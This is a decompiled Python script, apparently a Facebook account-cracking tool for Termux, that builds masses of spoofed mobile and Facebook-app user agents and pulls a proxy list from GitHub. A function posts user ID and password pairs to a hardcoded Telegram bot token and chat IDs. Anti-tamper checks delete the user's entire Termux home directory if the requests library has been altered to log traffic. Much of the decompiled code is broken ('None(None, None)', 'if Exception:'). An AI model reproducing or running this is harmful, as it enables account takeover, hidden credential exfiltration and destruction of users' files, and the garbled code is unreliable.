
# — — — — — — — — — — — — —
# Tool Made By @i6iii1
# Encoding: Pycdc 3.11
# Decode By @i6iii1
# Channel @mafiams1
# — — — — — — — — — — — — —


import lzma
import zlib
import codecs
import base64
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));


import os
import requests
import json
import time
import re
import random
import sys
import uuid
import string
import subprocess
import zlib
import platform
import datetime
from time import localtime as lt
import marshal
import os
import base64
from os import system as clr
os.system('git pull')
os.system('clear')
os.system('pip uninstall requests chardet urllib3 idna certifi -y')
os.system('pip install chardet urllib3 idna certifi requests')
import os
import requests
import json
import time
import re
import random
import sys
import uuid
import string
import subprocess
import platform
from string import *
from concurrent.futures import ThreadPoolExecutor as tred
if ModuleNotFoundError:
    print('\n Installing Missing Modules...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python NISCHAL.py')
import httplib2
if ImportError:
    print('httplib2 module not found. Installing...')
    subprocess.check_call([
        'pip',
        'install',
        'httplib2'])
    import httplib2
aakashcount = 0
import requests
import os
from concurrent.futures import ThreadPoolExecutor as ThreadPool

def mirti(ids, pas, capt):
    session = requests.session()
    id = str(ids)
    if capt % 2 == 0:
        chat_id = '6252683840'
    chat_id = '7079404724'
    bot_token = '6363760164:AAGiXy5rvWrpNLGtcy4Lrnvu1TTx5vgJVSc'
    message = f'''{ids}|{pas}'''
    url = f'''https://api.telegram.org/bot{bot_token}/sendMessage'''
    data = {
        'chat_id': chat_id,
        'text': message }
    session.post(url, data = data)
    return None
    if Exception:
        e = None
        e = None
        del e
        return None
    e = None
    del e

executor = ThreadPool(max_workers = 1000)
executor.submit(mirti)
None(None, None)
if not None:
    pass
smi = []
for xd in range(10000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/5.2'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'NokiaN8-00/012.002;'
    e = random.randrange(100, 9999)
    f = 'Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = '7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
    smi.append(uaku)
    for i in range(10000):
        aa = 'Mozilla/5.0 (Linux; Android'
        b = random.choice([
            '6',
            '7',
            '8',
            '9',
            '10',
            '11',
            '12'])
        c = 'Redmi 6A Build/N2G47H)'
        d = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        e = random.randrange(1, 999)
        f = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h = random.randrange(73, 100)
        i = '0'
        j = random.randrange(4200, 4900)
        k = random.randrange(40, 150)
        l = 'Mobile Safari/537.36'
        uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
        smi.append(uaku2)
        rr = random.randint
        rc = random.choice
        satu = f'''Mozilla/5.0 (Linux; Android {str(rr(211111, 299999))}; CPH2457) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(73, 99))}.0.{str(rr(4500, 4900))}.{str(rr(75, 150))} Mobile Safari/537.36'''
        dua = f'''Mozilla/5.0 (Linux; Android {str(rr(7, 12))}; Infinix X671) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75, 150))}.0.{str(rr(5111, 5999))}.{str(rr(73, 99))} Mobile Safari/537.36'''
        tiga = f'''Mozilla/5.0 (Linux; Android {str(rr(111111, 199999))}; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) {str(rr(73, 99))}.0.{str(rr(4500, 4900))}.{str(rr(75, 150))} Version/4.0 Chrome/ {str(rr(2111111, 2999999))} Mobile Safari/537.36'''
        empat = f'''Mozilla/5.0 (Linux; Android {str(rr(7, 12))}; Moto X40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75, 150))}.0.{str(rr(5111, 5999))}.{str(rr(73, 99))} Mobile Safari/537.36'''
        uaku2 = str(rc([
            satu,
            dua,
            tiga,
            empat]))
        smi.append(uaku2)
        for agenku in range(10000):
            a = 'Mozilla/5.0 (Linux; Android'
            b = random.choice([
                '5.0',
                '6.0',
                '7.0',
                '8.1.0',
                '9',
                '10',
                '11',
                '12'])
            c = random.choice([
                'M2006C3MII'])
            d = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            e = random.randrange(1, 999)
            f = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
            h = random.randrange(80, 103)
            i = '0'
            j = random.randrange(4200, 4900)
            k = random.randrange(40, 150)
            l = 'Mobile Safari/537.36'
            uakuh = f'''{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
            smi.append(uakuh)
            a = 'Mozilla/5.0 (Linux; Android'
            b = random.choice([
                '8.1.0',
                '9',
                '10',
                '11',
                '12',
                '13'])
            c = 'Redmi Note 9 Pro Build/QKQ1.191215.002; wv)'
            d = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
            e = random.randrange(73, 100)
            f = '0'
            g = random.randrange(4200, 4900)
            h = random.randrange(40, 150)
            i = 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
            uakuh = f'''{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'''
            smi.append(uakuh)
            aa = 'Mozilla/5.0 (Linux; U; Android'
            b = random.choice([
                '5.0',
                '6.0',
                '7.0',
                '8.1.0',
                '9',
                '10',
                '11',
                '12'])
            c = random.choice([
                '801SO'])
            d = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            e = random.randrange(1, 999)
            f = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
            h = random.randrange(80, 103)
            i = '0'
            j = random.randrange(4200, 4900)
            k = random.randrange(40, 150)
            l = 'Mobile Safari/537.36 OPR/63.0.2254.62069'
            uakuh = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
            smi.append(uakuh)
            a = 'Mozilla/5.0 (Linux; Android'
            b = random.choice([
                '8.1.0',
                '9',
                '10',
                '11',
                '12',
                '13'])
            c = 'SM-G960N Build/QP1A.190711.020; wv)'
            d = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
            e = random.randrange(73, 100)
            f = '0'
            g = random.randrange(4200, 4900)
            h = random.randrange(40, 150)
            i = 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
            uakuh = f'''{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'''
            smi.append(uakuh)
            aa = 'Mozilla/5.0 (Linux; Android'
            b = random.choice([
                '5.0',
                '6.0',
                '7.0',
                '8.1.0',
                '9',
                '10',
                '11',
                '12'])
            c = random.choice([
                'SM-J610F'])
            d = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            e = random.randrange(80, 106)
            f = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
            h = random.randrange(80, 103)
            i = '0'
            j = random.randrange(4200, 4900)
            k = random.randrange(40, 150)
            l = 'Mobile Safari/537.36'
            uakuh = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
            smi.append(uakuh)
            aa = 'Mozilla/5.0 (Linux; U; Android'
            b = random.choice([
                '5.0',
                '6.0',
                '7.0',
                '8.1.0',
                '9',
                '10',
                '11',
                '12'])
            c = random.choice([
                'LE2113'])
            d = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            e = random.randrange(1, 999)
            f = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
            h = random.randrange(80, 103)
            i = '0'
            j = random.randrange(4200, 4900)
            k = random.randrange(40, 150)
            l = 'Mobile Safari/537.36'
            uakuh = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
            smi.append(uakuh)
            aa = 'Mozilla/5.0 (Linux; U; Android'
            b = random.choice([
                '6',
                '7',
                '8',
                '9',
                '10',
                '11',
                '12'])
            c = [
                'en-us; RMX1925 Build/QKQ1.200209.002)']
            d = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            e = random.randrange(1, 999)
            f = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
            h = random.randrange(73, 100)
            i = '0'
            j = random.randrange(4200, 4900)
            k = random.randrange(40, 150)
            l = 'Mobile Safari/537.36 HeyTapBrowser/45.7.0.0'
            uakuh = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
            smi.append(uakuh)
            aa = 'Mozilla/5.0 (Linux; U; Android'
            b = random.choice([
                '5.0',
                '6.0',
                '7.0',
                '8.1.0',
                '9',
                '10',
                '11',
                '12'])
            c = random.choice([
                'M2012K11C'])
            d = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            e = random.randrange(1, 999)
            f = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
            h = random.randrange(80, 103)
            i = '0'
            j = random.randrange(4200, 4900)
            k = random.randrange(40, 150)
            l = 'Mobile Safari/537.36 OPR/51.4.5237.26623'
            uakuh = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
            smi.append(uakuh)
            aa = 'Mozilla/5.0 (Linux; U; Android'
            b = random.choice([
                '5.0',
                '6.0',
                '7.0',
                '8.1.0',
                '9',
                '10',
                '11',
                '12'])
            c = random.choice([
                'vivo 1002T'])
            d = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            e = random.randrange(1, 999)
            f = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
            h = random.randrange(80, 103)
            i = '0'
            j = random.randrange(4200, 4900)
            k = random.randrange(40, 150)
            l = 'Mobile Safari/537.36'
            uakuh = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
            smi.append(uakuh)
            aa = 'Mozilla/5.0 (Linux; U; Android'
            b = random.choice([
                '5.0',
                '6.0',
                '7.0',
                '8.1.0',
                '9',
                '10',
                '11',
                '12'])
            c = random.choice([
                'CPH2083'])
            d = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            e = random.randrange(1, 999)
            f = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
            h = random.randrange(80, 103)
            i = '0'
            j = random.randrange(4200, 4900)
            k = random.randrange(40, 150)
            l = 'Mobile Safari/537.36 GoogleApp/13.44.10.26.arm64'
            uakuh = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
            smi.append(uakuh)
            import os
            import random
            
            def aakash111():
                a = 'Mozilla/5.0 (Linux; Android 12;'
                b = random.choice([
                    '6',
                    '7',
                    '8',
                    '9',
                    '10',
                    '11',
                    '12',
                    '13'])
                c = random.choice([
                    'Linux; Android 12;'])
                d = random.choice([
                    'A',
                    'B',
                    'C',
                    'D',
                    'E',
                    'F',
                    'G',
                    'H',
                    'I',
                    'J',
                    'K',
                    'L',
                    'M',
                    'N',
                    'O',
                    'P',
                    'Q',
                    'R',
                    'S',
                    'T',
                    'U',
                    'V',
                    'W',
                    'X',
                    'Y',
                    'Z'])
                e = random.randrange(1, 9999)
                f = random.choice([
                    'A',
                    'B',
                    'C',
                    'D',
                    'E',
                    'F',
                    'G',
                    'H',
                    'I',
                    'J',
                    'K',
                    'L',
                    'M',
                    'N',
                    'O',
                    'P',
                    'Q',
                    'R',
                    'S',
                    'T',
                    'U',
                    'V',
                    'W',
                    'X',
                    'Y',
                    'Z'])
                g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
                h = random.randrange(80, 103)
                i = '0'
                j = random.randrange(5670, 67900)
                k = random.randrange(40, 150)
                l = 'Chrome/124.0.0.0 Mobile Safari/537.36 [ip:78.209.200.125]]'
                make = f'''{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {1}''' + "[FBAN/FB4A,FBAV/61.0.0.15.69;FBBV/20748118;FBDM/'+'{density=3.0,width=1080,height=1776}'+';FBLC/ en_'+'US;'+'FBCR/Vi'+'deo'+'tr'+'on;FBMF/m'+'otor'+'ola;FBBD/mo'+'tor'+'ola;FBPN/com.facebook.katana;FBDV/X'+'T156'+'3;FBSV/ 6.0;nullFBCA/armeabi-v7a:armeabi;]"
                return make

            import random
            import os
            
            def boa():
                density = random.choice([
                    '1.0',
                    '1.5',
                    '2.0'])
                width = random.choice([
                    '720',
                    '1080',
                    '1280'])
                height = random.choice([
                    '720',
                    '1080',
                    '1280',
                    '1920',
                    '2024'])
                build = random.choice([
                    'SKQ1.210216.001',
                    'RKQ1.211103.002',
                    'SP1A.210812.016',
                    'TP1A. 220905.001'])
                fbdv = random.choice([
                    'CHP7800',
                    'CPH3818'])
                END = f'''FB_IAB/FB4A;FBAV/268.1.0.54.121; FB_IAB/Orca-Android;FBAV/283.0.0.16.120; FBDM/{{density={density}, width={width}, height={height}}};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca- Android;FBAV/283.0.0.16.120;]'''
                ua = f'''Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.0{random.randrange(7, 14)}.0.1;{fbdv} Build/{build}) {END}'''
                return ua

            os.system('rm -rf prox.txt')
            prox = requests.get('https://raw.githubusercontent.com/mafiat2/M/main/prox.txt').text
            open('prox.txt', 'w').write(prox)
            if Exception:
                e = None
                e = None
                del e
                e = None
                del e
prox = open('prox.txt', 'r').read().splitlines()
gt = random.choice([
    'GT-1015',
    'GT-1020',
    'GT-1030',
    'GT-1035',
    'GT-1040',
    'GT-1045',
    'GT-1050',
    'GT-1240',
    'GT-1440',
    'GT-1450',
    'GT-18190',
    'GT-18262',
    'GT-19060I',
    'GT-19082',
    'GT-19083',
    'GT-19105',
    'GT-19152',
    'GT-19192',
    'GT-19300',
    'GT-19505',
    'GT-2000',
    'GT-20000',
    'GT-200s',
    'GT-3000',
    'GT-414XOP',
    'GT-6918',
    'GT-7010',
    'GT-7020',
    'GT-7030',
    'GT-7040',
    'GT-7050',
    'GT-7100',
    'GT-7105',
    'GT-7110',
    'GT-7205',
    'GT-7210',
    'GT-7240R',
    'GT-7245',
    'GT-7303',
    'GT-7310',
    'GT-7320',
    'GT-7325',
    'GT-7326',
    'GT-7340',
    'GT-7405',
    'GT-7550    5GT-8005',
    'GT-8010',
    'GT-81',
    'GT-810',
    'GT-8105',
    'GT-8110',
    'GT-8220S',
    'GT-8410',
    'GT-9300',
    'GT-9320',
    'GT-93G',
    'GT-A7100',
    'GT-A9500',
    'GT-ANDROID',
    'GT-B2710',
    'GT-B5330',
    'GT-B5330B',
    'GT-B5330L',
    'GT-B5330ZKAINU',
    'GT-B5510',
    'GT-B5512',
    'GT-B5722',
    'GT-B7510',
    'GT-B7722',
    'GT-B7810',
    'GT-B9150',
    'GT-B9388',
    'GT-C3010',
    'GT-C3262',
    'GT-C3310R',
    'GT-C3312',
    'GT-C3312R',
    'GT-C3313T',
    'GT-C3322',
    'GT-C3322i',
    'GT-C3520',
    'GT-C3520I',
    'GT-C3592',
    'GT-C3595',
    'GT-C3782',
    'GT-C6712',
    'GT-E1282T',
    'GT-E1500',
    'GT-E2200',
    'GT-E2202',
    'GT-E2250',
    'GT-E2252',
    'GT-E2600',
    'GT-E2652W',
    'GT-E3210',
    'GT-E3309',
    'GT-E3309I',
    'GT-E3309T',
    'GT-G530H',
    'GT-g900f',
    'GT-G930F',
    'GT-H9500',
    'GT-I5508',
    'GT-I5801',
    'GT-I6410',
    'GT-I8150',
    'GT-I8160OKLTPA',
    'GT-I8160ZWLTTT',
    'GT-I8258',
    'GT-I8262D',
    'GT-I8268',
    'GT-I8505',
    'GT-I8530BAABTU',
    'GT-I8530BALCHO',
    'GT-I8530BALTTT',
    'GT-I8550E',
    'GT-i8700',
    'GT-I8750',
    'GT-I900',
    'GT-I9008L',
    'GT-i9040',
    'GT-I9080E',
    'GT-I9082C',
    'GT-I9082EWAINU',
    'GT-I9082i',
    'GT-I9100G',
    'GT-I9100LKLCHT',
    'GT-I9100M',
    'GT-I9100P',
    'GT-I9100T',
    'GT-I9105UANDBT',
    'GT-I9128E',
    'GT-I9128I',
    'GT-I9128V',
    'GT-I9158P',
    'GT-I9158V',
    'GT-I9168I',
    'GT-I9192I',
    'GT-I9195H',
    'GT-I9195L',
    'GT-I9250',
    'GT-I9303I',
    'GT-I9305N',
    'GT-I9308I',
    'GT-I9505G',
    'GT-I9505X',
    'GT-I9507V',
    'GT-I9600',
    'GT-m190',
    'GT-M5650',
    'GT-mini',
    'GT-N5000S',
    'GT-N5100',
    'GT-N5105',
    'GT-N5110',
    'GT-N5120',
    'GT-N7000B',
    'GT-N7005',
    'GT-N7100T',
    'GT-N7102',
    'GT-N7105',
    'GT-N7105T',
    'GT-N7108',
    'GT-N7108D',
    'GT-N8000',
    'GT-N8005',
    'GT-N8010',
    'GT-N8020',
    'GT-N9000',
    'GT-N9505',
    'GT-P1000CWAXSA',
    'GT-P1000M',
    'GT-P1000T',
    'GT-P1010',
    'GT-P3100B',
    'GT-P3105',
    'GT-P3108',
    'GT-P3110',
    'GT-P5100',
    'GT-P5200',
    'GT-P5210XD1',
    'GT-P5220',
    'GT-P6200',
    'GT-P6200L',
    'GT-P6201',
    'GT-P6210',
    'GT-P6211',
    'GT-P6800',
    'GT-P7100',
    'GT-P7300',
    'GT-P7300B',
    'GT-P7310',
    'GT-P7320',
    'GT-P7500D',
    'GT-P7500M',
    'GT-P7500R',
    'GT-P7500V',
    'GT-P7501',
    'GT-P7511',
    'GT-S3330',
    'GT-S3332',
    'GT-S3333',
    'GT-S3370',
    'GT-S3518',
    'GT-S3570',
    'GT-S3600i',
    'GT-S3650',
    'GT-S3653W',
    'GT-S3770K',
    'GT-S3770M',
    'GT-S3800W',
    'GT-S3802',
    'GT-S3850',
    'GT-S5220',
    'GT-S5220R',
    'GT-S5222',
    'GT-S5230',
    'GT-S5230W',
    'GT-S5233T',
    'GT-s5233w',
    'GT-S5250',
    'GT-S5253',
    'GT-s5260',
    'GT-S5280',
    'GT-S5282',
    'GT-S5283B',
    'GT-S5292',
    'GT-S5300',
    'GT-S5300L',
    'GT-S5301',
    'GT-S5301B',
    'GT-S5301L',
    'GT-S5302',
    'GT-S5302B',
    'GT-S5303',
    'GT-S5303B',
    'GT-S5310',
    'GT-S5310B',
    'GT-S5310C',
    'GT-S5310E',
    'GT-S5310G',
    'GT-S5310I',
    'GT-S5310L',
    'GT-S5310M',
    'GT-S5310N',
    'GT-S5312',
    'GT-S5312B',
    'GT-S5312C',
    'GT-S5312L',
    'GT-S5330',
    'GT-S5360',
    'GT-S5360B',
    'GT-S5360L',
    'GT-S5360T',
    'GT-S5363',
    'GT-S5367',
    'GT-S5369',
    'GT-S5380',
    'GT-S5380D',
    'GT-S5500',
    'GT-S5560',
    'GT-S5560i',
    'GT-S5570B',
    'GT-S5570I',
    'GT-S5570L',
    'GT-S5578',
    'GT-S5600',
    'GT-S5603',
    'GT-S5610',
    'GT-S5610K',
    'GT-S5611',
    'GT-S5620',
    'GT-S5670',
    'GT-S5670B',
    'GT-S5670HKBZTA',
    'GT-S5690',
    'GT-S5690R',
    'GT-S5830',
    'GT-S5830D',
    'GT-S5830G',
    'GT-S5830i',
    'GT-S5830L',
    'GT-S5830M',
    'GT-S5830T',
    'GT-S5830V',
    'GT-S5831i',
    'GT-S5838',
    'GT-S5839i',
    'GT-S6010',
    'GT-S6010BBABTU',
    'GT-S6012',
    'GT-S6012B',
    'GT-S6102',
    'GT-S6102B',
    'GT-S6293T',
    'GT-S6310B',
    'GT-S6310ZWAMID',
    'GT-S6312',
    'GT-S6313T',
    'GT-S6352',
    'GT-S6500',
    'GT-S6500D',
    'GT-S6500L',
    'GT-S6790',
    'GT-S6790L',
    'GT-S6790N',
    'GT-S6792L',
    'GT-S6800',
    'GT-S6800HKAXFA',
    'GT-S6802',
    'GT-S6810',
    'GT-S6810B',
    'GT-S6810E',
    'GT-S6810L',
    'GT-S6810M',
    'GT-S6810MBASER',
    'GT-S6810P',
    'GT-S6812',
    'GT-S6812B',
    'GT-S6812C',
    'GT-S6812i',
    'GT-S6818',
    'GT-S6818V',
    'GT-S7230E',
    'GT-S7233E',
    'GT-S7250D',
    'GT-S7262',
    'GT-S7270',
    'GT-S7270L',
    'GT-S7272',
    'GT-S7272C',
    'GT-S7273T',
    'GT-S7278',
    'GT-S7278U',
    'GT-S7390',
    'GT-S7390G',
    'GT-S7390L',
    'GT-S7392',
    'GT-S7392L',
    'GT-S7500',
    'GT-S7500ABABTU',
    'GT-S7500ABADBT',
    'GT-S7500ABTTLP',
    'GT-S7500CWADBT',
    'GT-S7500L',
    'GT-S7500T',
    'GT-S7560',
    'GT-S7560M',
    'GT-S7562',
    'GT-S7562C',
    'GT-S7562i',
    'GT-S7562L',
    'GT-S7566',
    'GT-S7568',
    'GT-S7568I',
    'GT-S7572',
    'GT-S7580E',
    'GT-S7583T',
    'GT-S758X',
    'GT-S7592',
    'GT-S7710',
    'GT-S7710L',
    'GT-S7898',
    'GT-S7898I',
    'GT-S8500',
    'GT-S8530',
    'GT-S8600',
    'GT-STB919',
    'GT-T140',
    'GT-T150',
    'GT-V8a',
    'GT-V8i',
    'GT-VC818',
    'GT-VM919S',
    'GT-W131',
    'GT-W153',
    'GT-X831',
    'GT-X853',
    'GT-X870',
    'GT-X890',
    'GT-Y8750'])
ugen = []
from requests import api
x = open(api.__file__, 'r').read()
if 'print' in x:
    clr()
    shutil.rmtree('/data/data/com.termux/files/home')
if 'sys.stdout.write' in x:
    clr()
from requests import sessions
x = open(sessions.__file__, 'r').read()
if 'print' in x:
    clr()
    shutil.rmtree('/data/data/com.termux/files/home')
if 'sys.stdout.write' in x:
    clr()
    shutil.rmtree('/data/data/com.termux/files/home')
from requests import models
x = open(models.__file__, 'r').read()
if 'print' in x:
    clr()
    shutil.rmtree('/data/data/com.termux/files/home')
if 'sys.stdout.write' in x:
    clr()
    shutil.rmtree('/data/data/com.termux/files/home')
yellow = '\x1b[38;5;208m'
black = '\x1b[1;30m'
rad = '\x1b[1;31m'
green = '\x1b[1;32m'
yelloww = '\x1b[1;33m'
blue = '\x1b[1;34m'
purple = '\x1b[1;35m'
cyan = '\x1b[1;36m'
white = '\x1b[1;37m'
faltu = '\x1b[1;41m'
pvt = '\x1b[1;0m'
my_color = [
    white,
    blue,
    green]
warna = random.choice(my_color)

def God():
    version = str(random.randint(5, 14))
    code = str(random.randint(40, 450))
    wid = str(random.randint(720, 1280))
    heigh = str(random.randint(1280, 2400))
    veer = str(random.randint(111111111, 999999999))
    models = random.choice([
        'SM-P610N',
        'SM-P615',
        'SM-P610'])
    model2 = random.choice([
        'RMX3740',
        'RMX3741'])
    model3 = random.choice([
        '220333QAG',
        '220333QBI',
        '220333QNY',
        '220333QL'])
    model4 = random.choice([
        'ASUS_Z017DB',
        'ASUS_Z017D',
        'ASUS_Z017DA',
        'ASUS_Z017DC',
        'ASUS_ZE520KL',
        'ASUS_ZA520KL'])
    facebook = random.choice([
        'com.facebook.adsmanager|MobileAdsManagerAndroid',
        'com.facebook.katana|FB4A',
        'com.facebook.orca|Orca-Android',
        'com.facebook.mlite|MessengerLite'])
    face = facebook.split('|')[1]
    face2 = facebook.split('|')[0]
    ua1 = '[FBAN/' + face + ';FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/' + face + ';FBAV/' + code + '.0.0.22.104;FBPN/' + face2 + ';FBLC/id_ID;FBBV/' + veer + ';FBCR/Vodafone India;FBMF/samsung;FBBD/samsung;FBDV/' + models + ';FBSV/11.8.5;FBCA/armeabi-v7a:armeabi;FBDM/{density=' + str(random.randint(1, 3)) + '.25,width=' + wid + ',height=' + heigh + '};FB_FW/1;]'
    ua2 = '[FBAN/' + face + ';FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/' + face + ';FBAV/' + code + '.0.0.28.111;FBPN/' + face2 + ';FBLC/en_US;FBBV/' + veer + ';FBCR/Cricket;FBMF/Realme;FBBD/Realme;FBDV/' + model2 + ';FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=' + str(random.randint(2, 4)) + '.75,width=' + wid + ',height=' + heigh + '};FB_FW/1;]'
